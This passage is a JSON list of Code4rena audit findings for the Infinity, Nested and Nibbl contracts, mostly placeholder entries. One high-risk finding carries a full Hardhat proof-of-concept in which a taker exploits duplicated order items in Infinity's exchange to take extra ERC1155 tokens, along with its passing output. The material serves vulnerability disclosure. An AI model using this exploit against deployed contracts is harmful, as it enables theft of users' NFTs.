["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/18", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/17", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/13", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "`canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/12", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243   # Vulnerability details  ## Impact When any user provides a `sellOrder` and they are trying to sell multiple tokens from _n_ (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.  In short, hackers can violate the user-defined orders.  ## Root Cause The logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.  __Let's `canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems) ` as an example, while `canExecMatchOneToMany` shares the same error.__   Specifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.  The problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.  For example, if the order requires ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ];  ```  and the taker provides ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ]; ```  The taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.  As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.  ## Proof of Concept First put the `MockERC1155.sol` under the `contracts/` directory: ```solidity  // SPDX-License-Identifier: MIT pragma solidity 0.8.14; import {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol'; import {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol'; import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';  contract MockERC1155 is ERC1155URIStorage, Ownable {   uint256 numMints;    constructor(string memory uri) ERC1155(uri) {}    function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {     super._mint(to, id, amount, data);   } } ```  And then put `poc.js` under the `test/` directory. ```js const { expect } = require('chai'); const { ethers, network } = require('hardhat'); const { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils'); const {   getCurrentSignedOrderPrice,   approveERC20,   grantApprovals,   signOBOrder } = require('../helpers/orders');  async function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {   // grant approvals   const approvals = await grantApprovals(user, order, signer, infinityExchange.address);   if (!approvals) {     return undefined;   }    // sign order   const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);    const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);   if (!isSigValid) {     console.error('Signature is invalid');     return undefined;   }   return signedOBOrder; }  describe('PoC', function () {   let signers,     dev,     matchExecutor,     victim,     hacker,     token,     infinityExchange,     mock1155Contract1,     mock1155Contract2,     obComplication    const sellOrders = [];    let orderNonce = 0;    const UNIT = toBN(1e18);   const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);    const totalNFTSupply = 100;   const numNFTsToTransfer = 50;   const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;    function toBN(val) {     return ethers.BigNumber.from(val.toString());   }    before(async () => {     // signers     signers = await ethers.getSigners();     dev = signers[0];     matchExecutor = signers[1];     victim = signers[2];     hacker = signers[3];     // token     token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);      // NFT constracts (ERC1155)     mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri1'     ]);     mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri2'     ]);      // Exchange     infinityExchange = await deployContract(       'InfinityExchange',       await ethers.getContractFactory('InfinityExchange'),       dev,       [token.address, matchExecutor.address]     );      // OB complication     obComplication = await deployContract(       'InfinityOrderBookComplication',       await ethers.getContractFactory('InfinityOrderBookComplication'),       dev     );      // add currencies to registry     await infinityExchange.addCurrency(token.address);     await infinityExchange.addCurrency(NULL_ADDRESS);      // add complications to registry     await infinityExchange.addComplication(obComplication.address);      // send assets     await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());     await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());     for (let i = 0; i < numNFTsToTransfer; i++) {       await mock1155Contract1.mint(victim.address, i, 50, '0x');       await mock1155Contract2.mint(victim.address, i, 50, '0x');     }   });    describe('StealERC1155ByDuplicateItems', () => {     it('Passed test denotes successful hack', async function () {       // prepare order       const user = {         address: victim.address       };       const chainId = network.config.chainId ?? 31337;       const nfts = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];       const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };       const extraParams = {};       const nonce = ++orderNonce;       const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);       let numItems = 0;       for (const nft of nfts) {         numItems += nft.tokens.length;       }       const order = {         id: orderId,         chainId,         isSellOrder: true,         signerAddress: user.address,         numItems,         startPrice: ethers.utils.parseEther('1'),         endPrice: ethers.utils.parseEther('1'),         startTime: nowSeconds(),         endTime: nowSeconds().add(10 * 60),         nonce,         nfts,         execParams,         extraParams       };       const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);       expect(sellOrder).to.not.be.undefined;        // form matching nfts       const nfts_ = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];        // approve currency       let salePrice = getCurrentSignedOrderPrice(sellOrder);       await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);        // perform exchange       await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);        // owners after sale       // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1       // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss       expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);     });   }); }); ```  And run  ```bash $ npx hardhat test --grep PoC    PoC     StealERC1155ByDuplicateItems       \u2713 Passed test denotes successful hack ```  Note that the passed test denotes a successful hack.  ## Tools Used Manual inspection.  ## Recommended Mitigation Steps I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/7", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/6", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/1", "labels": [], "target": "2022-06-infinity-findings", "body": "Agreement & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/99", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/96", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Low level calls with solidity version 0.8.14 can result in optimiser bug.", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/94", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "Low level calls with solidity version 0.8.14 can result in optimiser bug."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/93", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/91", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/85", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/70", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "User can bypass entryFee by sending arbitrary calldata to ParaSwap operator", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "valid"], "target": "2022-06-nested-findings", "body": "User can bypass entryFee by sending arbitrary calldata to ParaSwap operator"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "`OwnerProxy` can call `selfdestruct()`", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/67", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-06-nested-findings", "body": "`OwnerProxy` can call `selfdestruct()`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/57", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/44", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/40", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/33", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "NestedFactory: Manipulations of setExitFees and setEntryFees", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-06-nested-findings", "body": "NestedFactory: Manipulations of setExitFees and setEntryFees"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/18", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/11", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/9", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Unchecked return value of transferFrom can allow a user to withdraw native token for free", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/8", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "Unchecked return value of transferFrom can allow a user to withdraw native token for free"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/3", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-06-nested-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-06-nested-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-06-nested-findings/issues/1", "labels": [], "target": "2022-06-nested-findings", "body": "Agreement & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/322", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/321", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/320", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Basket NFT have no name and symbol", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L6   # Vulnerability details  ## Impact The `Basket` contract is intended to be used behind a proxy. But the `ERC721` implementation used is not upgradeable, and its constructor is called at deployment time on the implementation. So all proxies will have a void name and symbol, breaking all potential integrations and listings.  ## Proof of Concept `ERC721(\"NFT Basket\", \"NFTB\")` is called at deployment time, and sets private variable at the implementation level. Therefore when loading the code during `delegateCall`, these variables will not be initialized.  ## Recommended Mitigation Steps The easiest mitigation would be to pass this variable as immutable so they are hardcoded in the implementation byte code.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/316", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/315", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/314", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/312", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/311", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/310", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/309", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/307", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "withdrawERC20 does not work on non-standard compliant tokens like USDT.", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "withdrawERC20 does not work on non-standard compliant tokens like USDT."}, {"title": "Use .call instead of .transfer", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/298", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "Use .call instead of .transfer"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/297", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/296", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/295", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/294", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/293", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/290", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Timelocks are ineffective without event emissions.", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/289", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Timelocks are ineffective without event emissions."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/288", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/287", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/286", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/285", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/284", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/283", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/281", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/280", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/279", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "NibblVault buyout duration longer than update timelock", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/278", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "NibblVault buyout duration longer than update timelock"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/277", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "[PNM-004] Calculation of `_secondaryReserveRatio` can be overflowed", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/273", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "[PNM-004] Calculation of `_secondaryReserveRatio` can be overflowed"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/270", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/265", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "[PNM-001] Function `permit` directly uses `_approve`, suffering from the well-known double attacks", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/264", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "[PNM-001] Function `permit` directly uses `_approve`, suffering from the well-known double attacks"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/259", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/258", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": 